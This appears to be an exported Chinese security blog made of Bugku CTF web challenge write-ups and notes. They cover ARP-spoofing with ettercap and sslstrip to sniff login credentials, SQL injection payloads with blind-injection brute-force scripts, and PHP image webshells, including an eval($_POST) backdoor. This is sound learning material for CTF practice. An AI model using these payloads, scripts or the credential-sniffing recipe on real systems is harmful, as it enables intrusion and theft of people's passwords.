kali的ip`![](https://inwena.sn.files.1drv.com/y4mvOQO7o2jwaX3uS-bszsyleJChAMKcJYS2F3wQbxI_A8sRrt3SKrNdh6icxVH_iYIBK5djv9Jot_cusHORly44T7A5qud72A3keEGOZcVAp-yzM3WpckTLeKcTlOhgCMQO6Ebzclk2Fj80sEw_CXwet3jxPZH05AGfUSKmvoZausxZfG7pXFbPdE-EFkoMd5J9G06HZDRQ7hszy9EdxGIOQ?width=797&height=74&cropmode=none) 使用 driftnet 工具 `driftnet -i 网卡名称` ，然后在目标机上百度搜索图片，可以看到 driftnet 有了反应，获取成功![](https://h9wfna.sn.files.1drv.com/y4maEJImx-z7BWuJwvDnx2bgAGCpSmnFBOhOhhsK7sKqP4Zfyr2V0ZA0TOrVp8U5EPl76GwyiYVbdSBgN2JTphARbR6kwrTulPdv7yNxTGC1xr-dqgaoFzyp1oupT9UlXYGOcdF1ZK55VvZCA4Vf_UhSAUzTbSsNwTrVirZHvl7wh-VFstxKJoy_nRzN1VfeqUyUABuMtjDIUs3ZmgIDL1Tyg?width=869&height=428&cropmode=none) 获取他人账号密码(HTTP) 物理机当作目标机 kali 先打开ip转发 `echo 1 > /proc/sys/net/ipv4/ip_forward` (了解更多) arp欺骗 `arpspoor -i 网卡名称 -t 目标机ip kali的ip`![](https://inwgna.sn.files.1drv.com/y4mnINHx8EKB1wnCCkSR5BpYn7NRZ_AWSgEgSceDtSKSHPhVliifwCU7im2INKDBpPTjfB2z6rPABrI7qdDA7ZE4Y-jwJB7uNjIHM_no2u5t-Ym5CDjB1_v_IZ0DAwQpBi-Y_PhMcy2vUZuZRfQ9TEJH6X7Tm5tFiWIBSBXl92JqcumfAMIvHrUPnSoqdkQIAANpJJfg1TBUaKsQCUjlQxW0Q?width=798&height=81&cropmode=none) 使用ettercap进行嗅探 `ettercap -Tq -i eth0`成功启动后![](https://inwina.sn.files.1drv.com/y4mk4bWHenzmqVaF-g6FvKpc7YEetQ_LDdazXXeja7SrN3YZVKpXTdCmjKaL1crn_KUlZ1fyZet-1w-lz0BXr3n0s9yJVyzTv9B_n3wfghdDj9XqqJ4hfxtdsHEq4C8dGQJzYCFHkU1jakt5DNwDJxR7HzAxF7q6Cb3J57GWgIIeaSp7fm5f1KOpy_IilZCs8_mvYv6_RTN0uhzOdUb-w9-0Q?width=853&height=572&cropmode=none) 在物理机上测试，在http协议的网站输入用户名和密码，发现已经被 ettercap 嗅探到![](https://idwana.sn.files.1drv.com/y4mrdKuFMljoYMuYuO8CKeo20lB8UrA86g8FpNKEc0wWBc1iMwy-Hb7ND6zrAHsBjlmBc5BkouVaF5Bxu48XXWYfUSO-UK1fJFG9h2HpfLIXbtbeGYcjoIZE8z2r61eal2yZ6g0exw2fGBGXu6ltnCLStqX8Jqyjq_0z36psC0uXiC-ZUr_yAPq1r2g2OkSAFvEvCXugE2RT0DO875z9o3aFA?width=929&height=55&cropmode=none) 获取他人账号密码(HTTPS)https://www.cnblogs.com/BloodZero/p/4415483.html 先`vim /etc/ettercap/etter.conf`找到如图段落，将 # 注释删去![](https://idvqna.sn.files.1drv.com/y4muF8KS1p6wZ8RA4WpqJmifTqHLsKRnkSIQaiVzUyj4ZLBmcAv-fvSSOyIoPAON6ZMWLfzA_jOYqfI0BP-TaeG0ozVDPdhvTCkYT8e8U8cVfQ2-JQNv6gW2CPVwx8bJtKpjoEOMZvNQzOhBynslzWuFStZIPM-cvecTzBp8rfsa-UANsn5ftVQKWhSeiPItxMz1sM9E1y-cyHkEYpxtohjRQ?width=929&height=187&cropmode=none) 配置 `echo 1 > /proc/sys/net/ipv4/ip_forward` 对 HTTPS 嗅探需要在 arp 欺骗 `arpspoof -i 网卡名称 -t 目标机ip 网关` 和 ettercap 抓包 `ettercap -Tq -i eth0` 时使用工具 sslstrip `sslstrip -a -f -k`![](https://inwhna.sn.files.1drv.com/y4m92EXHtVaB8JyILEUDTPWm495hKWotIpRWWhnWn1U0DPEoLBmb67JLMinzG9b82HjH64VEyqD9-mo0h9TlOeH0E3a_yskgqLNQsyhTDqNxM0mSnZJtMcUiLaCbzu02pgYC3ymC23a8KXP_lGwJJ8IG66_Yw10GFcs_dZgHpu2Gni5RgA-Dp2YiUwF8jKuZzcNytOYQR_bA49PmC9-liOSFQ?width=974&height=998&cropmode=none) 在目标机上测试，在https站点登陆(正常来说应该会被ettercap抓到，但是由于现在浏览器安全等级很高，直接阻止了建立连接，所以这个实验没有百分之百完成) 会话劫持]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Web</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-PHP_encrypt_1(ISCCCTF)]]></title>
    <url>%2F2018%2F08%2F21%2FWriteup%2FbugkuWeb%2FWP-Bugku-PHP-encrypt-1-ISCCCTF%2F</url>
    <content type="text"><![CDATA[题目直接给出了加密源码 123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 输出 fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= 这里直接给出解密的源码 1234567891011121314151617181920212223242526272829303132333435&lt;?phpfunction decrypt($str) &#123; $mkey = "729623334f0aa2784a1599fd374c120d"; $klen = strlen($mkey); $tmp = $str; $tmp = base64_decode($tmp); // 对 base64 后的字符串 decode $md_len = strlen($tmp); //获取字符串长度 for ($i=0; $i &lt; $md_len; $i++) &#123; // 取二次加密用 key; if ($x == $klen) // 数据长度是否超过 key 长度检测 $x = 0; $char .= $mkey[$x]; // 从 key 中取二次加密用 key $x+=1; &#125; $md_data = array(); for($i=0;$i&lt;$md_len;$i++) &#123; // 取偏移后密文数据 array_push($md_data, ord($tmp[$i])); &#125; $md_data_source = array(); $data1 = ""; $data2 = ""; foreach ($md_data as $key =&gt; $value) &#123; // 对偏移后的密文数据进行还原 $i = $key; if($i &gt;= strlen($mkey)) &#123;$i = $i - strlen($mkey);&#125; $dd = $value; $od = ord($mkey[$i]); array_push($md_data_source,$dd); $data1 .= chr(($dd+128)-$od); // 第一种可能, 余数+128-key 为回归数 $data2 .= chr($dd-$od); // 第二种可能, 余数直接-key 为回归数 &#125; print "data1 =&gt; ".$data1."&lt;br&gt;\n"; print "data2 =&gt; ".$data2."&lt;br&gt;\n";&#125;$str = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=";decrypt($str);?&gt; Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-login2(SKCTF)]]></title>
    <url>%2F2018%2F08%2F21%2FWriteup%2FbugkuWeb%2FWP-Bugku-login2-SKCTF%2F</url>
    <content type="text"><![CDATA[题目地址http://118.89.219.210:49165/ 随便输入用户名，密码抓包测试，发现返回的爆里有一个tip base64解码后的到源码: 123$sql="SELECT username,password FROM admin WHERE username='".$username."'";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123; &#125; 题目提示了union 那么尝试注入1&#39; union select 1,&#39;5f4dcc3b5aa765d61d8327deb882cf99&#39;--password 这里 5f4dcc3b5aa765d61d8327deb882cf99 是经过md5加密后的 password 登陆成功后跳转到了 http://118.89.219.210:49165/index.php]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-INSERT INTO注入]]></title>
    <url>%2F2018%2F08%2F19%2FWriteup%2FbugkuWeb%2FWP-Bugku-INSERT%20INTO%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web15/ 题目给了源码 123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123; $ip = ''; if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125;else&#123; $ip = $_SERVER['REMOTE_ADDR']; &#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); 这是X_FORWARDED_FOR注入，但是过滤了,在,被过滤的情况下，无法使用if语句当然在mysql下除了if还有 1select case when xxx then xxx else xxx end; 而且由于,被过滤，无法使用substr和substring，但是这里可以使用from 1 for 1替代，最后payload如下 111'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))%23 python 脚本 12345678910111213141516171819import requestsimport string mystring = string.ascii_letters+string.digitsurl='http://120.24.86.145:8002/web15/'data = "127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end) and '1'='1" #这里的&#123;&#125;对应的是后面所需要的formatflag = ''for i in range(1,35): for j in mystring: try: headers = &#123;'x-forwarded-for':data.format(str(i),j)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += j print flag breakprint 'The final flag:'+flag 这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。 得到 flag{cdbf14c9551d5be5612f7bb5d2867853}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>X_FORWARDED_FOR注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-各种绕过]]></title>
    <url>%2F2018%2F08%2F18%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web7/ 源码 12345678910111213141516171819 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 分析后发现，只要使uname的sha1和值与passwd的sha1的值相等即可， 但是同时他们两个的值又不能相等 那么构造数组get传参:?uname[]=1&amp;id=margin同时post传参:passwd[]=2 得到 flag{HACK_45hhs_213sDD} 这个和之前的前女友有点像，都是利用数组]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-文件上传2(湖湘杯)]]></title>
    <url>%2F2018%2F08%2F18%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02-%E6%B9%96%E6%B9%98%E6%9D%AF%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:9011/ 看大佬博客，直接构造的url，直接读取文件？？？？？？？ http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag 然后base64解码 得到flag{e00f8931037cbdb25f6b1d82dfe5552f}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>文件上传</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-求getshell]]></title>
    <url>%2F2018%2F08%2F17%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E6%B1%82getshell%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web9/ 打开后发现 My name is margin,give me a image file not a php 上传一个php文件不让上传，那么BP抓包 经过测试，将 Content-Type: 后参数改大写，修改文件名后缀为 .php5 ，文件类型改为图片类型 image/jpg 可以获得flag 得到 KEY{bb35dc123820e}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-文件包含2]]></title>
    <url>%2F2018%2F08%2F17%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2%2F</url>
    <content type="text"><![CDATA[题目地址http://118.89.219.210:49166/ 进入题目后发现这个页面，什么都没有 查看源代码 第一行发现 1&lt;!-- upload.php --&gt; 访问 http://118.89.219.210:49166/index.php?file=upload.php 出现上传页面 - CASE 01 这种方法是直接利用命令system(&quot;ls&quot;);来查看目录找到flag 只能上传图片，对大小有限制，那么上传个图片马 1&lt;?php system("ls"); ?&gt; 上传后提示: 那么就访问upload/201808170638381043.jpg构造urlhttp://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg 发现后台把&lt;?php,?&gt;替换成了_,_ 那么用``标签绕过 123&lt;script langulage=php&gt;system("ls");&lt;/script&gt; 再次上传，并打开文件所在地址 发现解析成功 页面出现如下内容 直接访问 this_is_th3_F14g_154f65sd4g35f4d6f43.txt 构造url:http://118.89.219.210:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt 得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun} - CASE 02 这种方法是上传木马后利用中国菜刀 有了上一次的经验，这里直接:文件名 1.php;.jpg内容: 1234&lt;script language=php&gt;echo 'aaaa';eval($_POST['aaaa']);&lt;/script&gt; 上传后访问http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg 发现成功显示了 aaaa 那么上菜刀 连接成功后 打开tx文件得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>文件包含</tag>
        <tag>图片马</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-login3(SKCTF)]]></title>
    <url>%2F2018%2F08%2F17%2FWriteup%2FbugkuWeb%2FWP-Bugku-login3-SKCTF%2F</url>
    <content type="text"><![CDATA[题目地址http://118.89.219.210:49167/ username输入admin，结果是存在的，返回密码错误 admin后加上单引号，但是返回是使用者名称不存在 这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯， 也就不能使用报错注入了，我们发现有两种返回资讯: username does not exist!和password error!,那我们可以利用这两个返回值进行布林盲注。 毕竟我也是第一次接触到这种布林型盲注，也当是小白扫盲吧，怎么利用啰嗦几句。 我们猜测后台的验证应该是先查询我们输入的使用者名称是否存在，大概是: select password,username from users where username=”我们输入的使用者名称” 如果我们在where语句的结尾加上一个and连线的布林判断语句，就可以根据返回值判断where条件是否成立，比如这道题就可以尝试补成 where username=’admin’ and (substring(database(),1,1)=’a’) 如果返回值是password error，那么就说明where语句是成立的，那么我们补充的那就也是成立的，那么就可以确定资料库的第一位是a,然后再猜测第二位。 但是这道题过滤了and！ ！ ！ 尝试加上and返回:经过尝试发现还过滤了空格，逗号，等号，for 空格用括号代替，等号用&lt;&gt;(一种不等号)代替 那怎么办呢，这就用上了今天介绍的异或运算^,先说一下基本规则: 1^1=0 1^0=1 0^0=0 就是说只有两个不同的布林值运算结果为1，其他为零 不过在这里用的时候先不要按这个规则去推，因为在我们用到的三个值的布林运算的sql语句中完全相反，我还没有搞明白，谁懂得话，给我评论下。 首先说下这里我们要补上两个布林值，这个最后再说为什么。 先猜资料库名，基本语句 admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^0# 解释一下为什么，为了绕过空格过滤，用括号隔开，过滤了等号，用不等号&lt;&gt;代替，只要是布林值就可以。 mid()函式和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx,from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？ 这里用到了ascii()取ascii码值的函式，如果传入一个字串那么就会取第一个字元的字元的ascii码值，这就有了for的作用，并且mid()函式是可以只写from的表示从第几位往后的字串，我们将取出的字串在传入ascii()中取第一位，就完成了对单个字元的提取。 每个字元的ascii码判断是不是不等于给定的数字，会得到一个布林值(0或1)再与结尾的0进行运算。 如果资料库名的第一位的ascii码值不是97，where条件是username=’admin’^1^0 返回值是username does not exist! 如果资料库名的第一位的ascii码值是97，where条件是username=’admin’^0^0 返回值会是password error! 这就构成了布林报错注入。 有人可能疑问大部分的判断都是无用的，就是说可能从97尝试到120都是username does not exist!，那如何快速找到语句成立时的返回结果(password error!)。 这里就是最后^0的妙用了， 因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。 补充一点，因为这里既是语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改不改返回值相同，那就是有语法错误，如果不同就可以参照上一段了。 这也是为什么要多加一个^0,看似多此一举，其实好处多多。 就是说admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^1# 就可以得到password error! 资料库名最后可以得到是:blindsql 下一步猜表名，表名好像没法暴力猜,因为关键词information被禁了！ ！ ！ ！ 那资料库名就没用了，哈哈哈，不过后面猜栏位的值是一样的原理，不亏不亏。 没法用系统表，就不能像上面一样爆破了，真的是猜了，是admin表，语句如下 admin’^(select(1)from(admin))^1# 返回password error!说明猜对了 猜栏位 admin’^(select(count(password))from(admin))^1# 返回password error!说明猜对了。 为什么要用count()呢，因为如果有多行资料也可能会报错，会干扰判断。 然后猜password的值，暴力猜解，与猜资料库类似: admin’^(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;97)^0# 得到密码的MD5值:51b7a76d51e70b419f60d3473fb6f900，解密后登陆，得到flag 1import requests str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125; -*/=" url="http://118.89.219.210:49167/index.php" r=requests.session() def databasere(): resutlt="" for i in range(30): fla = 0 for j in str_all: playlod="admin'^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#".format(str(i),ord(j)) data = &#123; "username": playlod, "password": "123" &#125; s=r.post(url,data) print(playlod) if "error" in s.text: resutlt =j print(resutlt) if fla == 0: break def password(): resutlt="" for i in range(40): fla=0 for j in str_all: playlod = "admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#".format(str(i 1),ord(j)) data = &#123; "username": playlod, "password": "123" &#125; s=r.post(url,data) print(playlod) if "error" in s.text: resutlt =j fla=1 print('**************************',resutlt) if fla==0: break #databasere() password()]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>基于布尔的SQL盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-细心]]></title>
    <url>%2F2018%2F08%2F16%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E7%BB%86%E5%BF%83%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web13/ 进入后发现是一个404错误页面 参考大佬WP，查看robots.txt 发现有:User-agent: *Disallow: /resusl.php 访问/resusl.php后看到if ($_GET[x]==$password) 此处省略1w字 那么就要GET传参， (看大佬WP传了admin，可能是题目和管理员有关吧…..) 构造payload?x=admin 得到flag(ctf_0098_lkji-s)]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-web8]]></title>
    <url>%2F2018%2F08%2F16%2FWriteup%2FbugkuWeb%2FWP-Bugku-web8%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web8/ 打开后有源码，代码审计 123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; 可以看出得到flag的途径是ac的值不为空，并且f的值从文件fn中获取，并且ac的值要恒等于f的值 构造payload?ac=flags&amp;fn=flag.txt 得到This is flag: flag{3cfb7a90fc0de31}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-程序员本地网站]]></title>
    <url>%2F2018%2F08%2F16%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/localhost/ 进入后提示从本地访问 那么BP抓包 加上这一行:X-Forwarded-For: 127.0.0.1 X-Forwarded-For: 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 得到flag{loc-al-h-o-st1}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-flag.php]]></title>
    <url>%2F2018%2F08%2F16%2FWriteup%2FbugkuWeb%2FWP-Bugku-flag.php%2F</url>
    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/flagphp/ 进入题目后看到的是登录框，题目提示“点了login咋没反应，提示:hint” 参考网上的WP， GET传参，构造后的url:http://120.24.86.145:8002/flagphp/?hint 就得到源码了: 1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once("flag.php");$cookie = $_COOKIE['ISecer'];if(isset($_GET['hint']))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === "$KEY")&#123; echo "$flag";&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel="stylesheet" href="admin.css" type="text/css"&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class="container" align="center"&gt; &lt;form method="POST" action="#"&gt; &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY='ISecer:www.isecer.com';?&gt; 意思是当得到 unserialize (反序列化)后的$cookie这个ISecer全等于$KEY后显示 flag这里要注意，$KEY的值并不是$KEY=&#39;ISecer:www.isecer.com&#39;;所显示的，而是&quot;&quot;，即空 那么php脚本一行: 123&lt;?php print_r(serialize("")); ?&gt; 得到结果:s:0:&quot;&quot;; BP抓包Go一下:得到flag{unserialize_by_virink}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>反序列化</tag>
        <tag>unserialize</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-Cookies欺骗]]></title>
    <url>%2F2018%2F08%2F14%2FWriteup%2FbugkuWeb%2FWP-Bugku-Cookies%E6%AC%BA%E9%AA%97%2F</url>
    <content type="text"><![CDATA[关于python requests.Session() 首先看到url上有base64编码解码后是 keys.txt url参数line是按行返回参考网上的脚本: 12345678import requestss=requests.Session()url='http://120.24.86.145:8002/web11/index.php'for i in range(1,20): payload=&#123;'line':str(i),'filename':'aW5kZXgucGhw'&#125; a=s.get(url,params=payload).content content=str(a,encoding="utf-8") print(content) 得到源码: 1234567891011121314151617181920212223242526272829303132333435error_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; bp抓包构造包:构造Cookie: margin=margin注意 filename 后的参数 keys.txt 要经过 base64 编码 得到:KEY{key_keys}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>web</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python_Requests模块初级使用]]></title>
    <url>%2F2018%2F08%2F13%2FPython-Requests%E6%A8%A1%E5%9D%97%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[发送请求先导入Requests模块 1import requests 获取某个网页 123456r = requests.get('url') #一个名为 r 的 Response 对象r = requests.post('url',data = &#123;'key':'value'&#125;) #发送一个 HTTP POST 请求r = requests.put('url',data = &#123;'key':'value'&#125;) #发送一个 HTTP PUT 请求r = requests.delete('url') #发送一个 HTTP DELETE 请求r = requests.head('url') #发送一个 HTTP HEAD 请求r = requests.options('url') #发送一个 HTTP OPTIONS 请求]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>requests模块</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-这是一个神奇的登陆框]]></title>
    <url>%2F2018%2F08%2F09%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86%2F</url>
    <content type="text"><![CDATA[题目地址:http://120.24.86.145:9001/sql/ 寻找注入点，找到1&quot;双引号会报错 order by判断字段数:1&quot;order by 1,2,3-- 找表:1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--根据提示，得到表flag1，whoami 继续找列1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;-- 找字段1&quot; union select flag1,2 from flag1-- 得到Login_Name:ed6b28e684817d9efcaf802979e57aea flag{ed6b28e684817d9efcaf802979e57aea}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-login1(SKCTF)]]></title>
    <url>%2F2018%2F08%2F09%2FWriteup%2FbugkuWeb%2FWP-Bugku-login1-SKCTF%2F</url>
    <content type="text"><![CDATA[题目地址:http://118.89.219.210:49163/ 本文转载自:https://delcoding.github.io/2018/03/bugku-writeup4/ 这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如: 1234mysql&gt; CREATE TABLE users ( -&gt; username varchar(25), -&gt; password varchar(25) -&gt; ); 这里的username只允许25个字符，超过后就舍去25字符以后的，然后在mysql中，admin跟admin [很多空格]在查询的时候是一样的。因为admin用户已经存在，但我们不知道他的密码，所以我们自己注册一个admin然后替换掉密码。所以我们可以注册一个admin[很多个空格]1的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用admin加你的密码去登陆即可得到flag。 SKCTF{4Dm1n_HaV3_GreAt_p0w3R}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>SQL约束攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-多次]]></title>
    <url>%2F2018%2F08%2F09%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E5%A4%9A%E6%AC%A1%2F</url>
    <content type="text"><![CDATA[题目地址:http://120.24.86.145:9004/]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sql注入</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-md5 collision(NUPT_CTF)]]></title>
    <url>%2F2018%2F08%2F09%2FWriteup%2FbugkuWeb%2FWP-Bugku-md5-collision-NUPT-CTF%2F</url>
    <content type="text"><![CDATA[题目地址:http://120.24.86.145:9009/md5.php md5 collision(MD5碰撞):本段转自https://www.jianshu.com/p/2791e2fdadfd MD5摘要算法可以从多个字节组成的串中计算出由32个字节构成的“特征串”，对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在不同的串能够得出相同MD5值的情况，即碰撞。 在PHP中的MD5中的0e的比较:PHP在处理哈希字符串时，会利用“！=”或“==”来对哈希值进行比较，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 这里给出常用的0e开头的MD5: 